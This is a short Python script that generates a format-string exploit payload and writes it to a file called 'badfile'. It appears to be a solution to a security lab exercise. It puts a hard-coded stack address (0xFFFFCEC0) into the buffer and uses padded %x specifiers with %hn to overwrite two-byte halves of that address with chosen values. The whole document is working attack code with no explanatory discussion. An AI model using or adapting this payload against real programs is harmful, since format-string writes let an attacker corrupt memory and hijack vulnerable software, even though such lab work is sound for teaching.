# Initialize the content array
CONTENT_LENGTH = 1000
content = bytearray(0 for i in range(CONTENT_LENGTH))

current_index = 0

"""Prefix format specifiers (optional)

N = 1
fmt1 = ("%.8x" * N).encode()  # %x means unsigned int as a hexadecimal number
content[current_index : current_index + len(fmt1)] = fmt1
current_index += len(fmt1)
print("format specifiers 1 is ", fmt1)
"""

# specify target_address
target_address = 0xFFFFCEC0
content[current_index : current_index + 4] = (target_address + 2).to_bytes(
    4, byteorder="little"
)
current_index += 4

# critical to add four random bytes
content[current_index : current_index + 4] = b"!@#$"
current_index += 4

content[current_index : current_index + 4] = (target_address).to_bytes(
    4, byteorder="little"
)
current_index += 4

small_value = 0x6688
large_value = 0x7799

# specify first 2 bytes (small)
N = 4
num_of_padding_zeros = small_value - 8 * (N - 1) - 4 * 3
fmt2 = ("%.8x" * (N - 1) + f"%.{num_of_padding_zeros}x" + "%hn").encode()
content[current_index : current_index + len(fmt2)] = fmt2
current_index += len(fmt2)
print("format specifiers 2 is ", fmt2)

# specify second 2 bytes (large)
fmt3 = (f"%.{large_value - small_value}x" + "%hn" + "\n").encode()
content[current_index : current_index + len(fmt3)] = fmt3
print("format specifiers 3 is ", fmt3)

with open("badfile", "wb") as f:
    f.write(content)
